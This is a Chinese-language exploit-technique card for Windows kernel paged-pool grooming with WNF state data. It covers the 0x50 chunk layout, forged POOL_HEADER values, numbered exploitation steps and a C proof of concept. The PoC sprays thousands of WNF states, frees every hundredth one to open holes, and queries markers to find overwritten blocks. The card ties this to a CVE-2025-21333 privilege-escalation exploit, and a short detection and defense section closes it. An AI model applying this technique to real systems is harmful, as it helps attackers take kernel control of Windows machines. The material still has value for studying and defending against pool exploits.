---
id: binary-pwn-kernel-windows-wnf-paged-pool-spray-hole-digging
title: Windows WNF 分页池喷射与挖洞：0x50 块布局、状态标记定位与洞填充
type: scenario
domain: binary
path: binary/pwn/kernel
technique: windows-wnf-paged-pool-spray-hole-digging
aliases:
- WNF 池喷射
- NtCreateWnfStateName
- NtUpdateWnfStateData
- WNF_STATE_DATA
- 分页池挖洞
- Windows 堆风水
- Wnf tag 0x20666e57
tags:
- windows
- kernel
- pwn
- pool-spray
- wnf
- paged-pool
- heap-grooming
- hole-digging
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V180
  verified_at: '2026-11-06T17:37:37+08:00'
  notes: 已对照原文与图45/57/63核对：POOL_HEADER(0x10)+WNF_STATE_DATA(0x10)+data(0x30)=0x50、NtCreateWnfStateName/NtUpdateWnfStateData 喷射与 NtDeleteWnfStateData 按步长100挖洞、data 标记定位、BlockSize=5/PoolType=0xb&~8/PoolTag='Wnf' 均一致；未在本机复跑
---

## 一句话结论

Windows WNF 状态数据在分页池中按 `POOL_HEADER(0x10) + WNF_STATE_DATA(0x10) + data(0x30) = 0x50` 分配；用 `NtCreateWnfStateName`/`NtUpdateWnfStateData` 批量喷射可占满连续池页，`NtDeleteWnfStateData` 按间隔删除可挖出 0x50 大小的洞，让后续漏洞分配落入洞中，再用 `NtQueryWnfStateData` 和数据标记定位/读写这些内核块。

## 原理

- **WNF 数据分配**：`NtCreateWnfStateName` 创建临时状态名（`WnfTemporaryStateName`、`WnfDataScopeMachine`、最大 0x1000），随后 `NtUpdateWnfStateData` 写入 0x30 字节数据；内核在分页池分配 `WNF_STATE_DATA + data`，加上 0x10 池头正好 0x50。
- **结构布局**：`_WNF_STATE_DATA` 大小 0x10：`Header`（`WNF_NODE_HEADER`：NodeTypeCode 0x0、NodeByteSize 0x2）、`AllocatedSize` 0x4、`DataSize` 0x8、`ChangeStamp` 0xc。data 紧随其后，长度可设为 0x30。
- **0x50 块的意义**：与常见池块（I/O Ring 预注册指针数组、管道 Attribute、伪造对象）大小一致；喷射大量 0x50 块后，段堆会分配新的连续页，形成可预测的连续池区域。
- **挖洞**：`NtDeleteWnfStateData` 只释放数据、保留状态名；按固定步长（示例每 100 个删一个）删除，形成间隔 0x50 的空洞。漏洞触发的分配会优先落入最近释放的洞，从而被前后喷射块夹住。
- **定位**：WNF data 的前 8 字节可写索引/标记（示例 0、0x4343434343434343、0x4444444444444444）；漏洞填充/后续对象写入后，用 `NtQueryWnfStateData` 遍历状态名，按标记找到对应内核块，并读出整块 0x10040 数据观察相邻布局。
- **伪造池头**：若溢出数据要伪装成 WNF 块，`POOL_HEADER` 需设 `BlockSize=0x5`（×0x10=0x50）、`PoolType=0xb & ~(1<<3)`（合法 PagePool 且清 PoolQuota 位，避免释放时扣配额蓝屏）、`PoolTag='Wnf'`（0x20666e57）、`ProcessBilled` 标记值；`WNF_STATE_DATA.DataSize/AllocatedSize` 随块号递减（示例 0x10040、0xfff0...），使结构看起来真实。
- **为什么有效**：WNF 是普通用户可调用、可批量创建且大小可控的分页池分配器；它把“池布局”变成用户态可控的确定性对象，配合任意溢出/UAF 即可把不可控的池溢出变成可预测的对象覆盖。

## 触发条件

- Windows 10/11，普通用户可调用 `NtCreateWnfStateName`/`NtUpdateWnfStateData`/`NtDeleteWnfStateData`/`NtQueryWnfStateData`。
- 目标漏洞会在分页池分配与 0x50 块同尺寸（或相近）的缓冲区，且分配发生在挖洞之后。
- 有足够内存/分页文件（示例 8 GB 内存、16~32 GB 分页文件），能承受数千个 WNF 状态。
- 需要能读取/查询 WNF 状态数据以验证布局（`NtQueryWnfStateData` 返回真实 DataSize 时可重查）。
- 目标未限制 WNF API 的批量创建或对状态数据做隔离。

## 利用步骤

1. **第一轮喷射**：创建 0x2000 个临时 WNF 状态名，每个 `NtUpdateWnfStateData(state, buffer, 0x30, ...)` 写入 0x30 字节；buffer 可填统一标记。
2. **第二轮喷射**：再创建 0x2000 个，形成连续池区域。
3. **挖洞**：从第二轮末尾开始，按步长 100 调用 `NtDeleteWnfStateData` 删除状态数据，留下 0x50 空洞；可保留一个已知标记（如 data[0]=0）作为锚点。
4. **触发漏洞**：让目标池溢出/分配落入洞中；溢出的伪造块按 0x50 布局填 `POOL_HEADER + WNF_STATE_DATA + data`，data 首 8 字节写索引。
5. **第三轮喷射**：再创建 0x500 个状态填充剩余空洞/稳定布局。
6. **定位**：遍历第二轮状态名，`NtQueryWnfStateData` 先读 0x30；若返回 `outsize > 0x30`，用真实大小重读；按 data 首 8 字节标记（0、0x4343...、0x4444...）找到被覆盖块与锚点。
7. **利用**：读出整块 `0x10040` 缓冲区，按 `PoolTag='IrRB'`/`'NpAt'` 定位 I/O Ring 预注册指针数组、管道 Attribute 等相邻对象，计算内核地址并配合任意读写原语提权。

## PoC

```c
#define Wnf_tag 0x20666e57
#define Wnf_max_data_size 0x1000

std::vector<WNF_STATE_NAME> states1(0x2000), states2(0x2000), states3(0x500);
unsigned char* buffer = new unsigned char[0x10080];
memset(buffer, 0x49, 0x30);      // WNF data 初始标记

// 第一轮、第二轮喷射
for (auto& s : states1) {
    NtCreateWnfStateName(&s, WnfTemporaryStateName, WnfDataScopeMachine,
                         FALSE, 0, Wnf_max_data_size, &sd_spraying);
    NtUpdateWnfStateData(&s, buffer, 0x30, 0, 0, 0, 0);
}
for (auto& s : states2) {
    NtCreateWnfStateName(&s, WnfTemporaryStateName, WnfDataScopeMachine,
                         FALSE, 0, Wnf_max_data_size, &sd_spraying);
    NtUpdateWnfStateData(&s, buffer, 0x30, 0, 0, 0, 0);
}

// 挖洞：第二轮按步长 100 删除
for (int i = 0x2000 - 0x100; i > 0; i -= 100)
    NtDeleteWnfStateData(&states2[i], NULL);

// 触发漏洞（此处省略，见 CVE-2025-21333 主卡）
// NtCreateCrossVmEvent(&hEvent, EVENT_ALL_ACCESS, &oa, 0, &guid, &guid);

// 第三轮喷射
for (auto& s : states3) {
    NtCreateWnfStateName(&s, WnfTemporaryStateName, WnfDataScopeMachine,
                         FALSE, 0, Wnf_max_data_size, &sd_spraying);
    NtUpdateWnfStateData(&s, buffer, 0x30, 0, 0, 0, 0);
}

// 定位标记
for (auto& s : states2) {
    ULONG stamp = 0, outsize = 0x30;
    NTSTATUS r = NtQueryWnfStateData(&s, NULL, NULL, &stamp, buffer, &outsize);
    if (r != 0 && outsize > 0x30) {
        ULONG real_size = outsize;
        NtQueryWnfStateData(&s, NULL, NULL, &stamp, buffer, &real_size);
        if (*(DWORD64*)buffer == 0x0) { /* 找到锚点 */ }
    }
}
```

伪造块布局（0x50）：

```text
POOL_HEADER     0x10  BlockSize=5, PoolType=0xb & ~8, PoolTag=0x20666e57
WNF_STATE_DATA  0x10  AllocatedSize/DataSize=0x10040.., ChangeStamp=1
data            0x30  首 8 字节为索引标记
```

原文用该布局在 CVE-2025-21333 利用中稳定填充 I/O Ring 与管道 Attribute 洞；PoC 未在本机复跑。

## 变体与关联

- 喷射对象变体：命名管道 `DATA_QUEUE_ENTRY`（tag `'NpAt'`/管道数据队列）、I/O Ring 预注册指针数组（tag `'IrRB'`）、注册表键值、ALPC 消息等同样可用于分页池布局。
- 挖洞策略变体：等距删除、随机删除、按页边界对齐删除；洞的数量与溢出分配频率需匹配。
- 关联：[[binary-pwn-kernel-cve-2025-21333-vkrnlintvsp-dacl-truncation-pool-overflow]]（主利用）、[[binary-pwn-kernel-windows-io-ring-pipe-arbitrary-rw]]（洞填充对象）、[[binary-pwn-kernel-windows-cng-pool-overflow-pipe-data-queue-token-steal]]（另一种池喷射/任意读写）。
- 边界：WNF API 被禁用/限制、目标使用不同池类型（非分页池）、或段堆行为随版本变化时，喷射/挖洞效果下降。

## 检测与防御

- 检测：短时间内创建/更新/删除数千个 WNF 状态名；WNF data 中出现 0x4343/0x4444/索引标记；异常 `WNF_STATE_DATA` 大小（0x10040、0xfff0）与 PoolTag 'Wnf'；WNF 调用与 `NtCreateCrossVmEvent`/I/O Ring 创建时间相邻。
- 防御：限制普通用户批量创建 WNF 状态；对 WNF 数据大小/数量做配额；启用内核池硬化与段堆隔离；监控异常池布局行为。
- 加固：及时安装相关 Windows 补丁；对可疑 WNF 使用做 ETW/EDR 检测。
